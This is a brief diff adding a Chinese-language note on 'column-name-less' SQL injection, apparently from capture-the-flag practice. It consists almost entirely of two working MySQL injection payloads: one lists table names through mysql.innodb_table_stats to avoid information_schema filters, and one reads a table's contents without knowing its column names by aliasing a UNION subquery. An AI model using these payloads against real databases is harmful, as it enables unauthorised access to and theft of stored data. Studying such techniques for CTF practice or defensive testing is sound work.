@@ -1,0 +1,5 @@
+无列名注入 
+
+payload如下
+0'union select 1,group_concat(table_name),1 from mysql.innodb_table_stats where database_name like database()# 查表名
+0'union select 1,(select group_concat(`3`) from (select 1,2,3 union select * from ccttttfff)n),1# 无列名查询字段
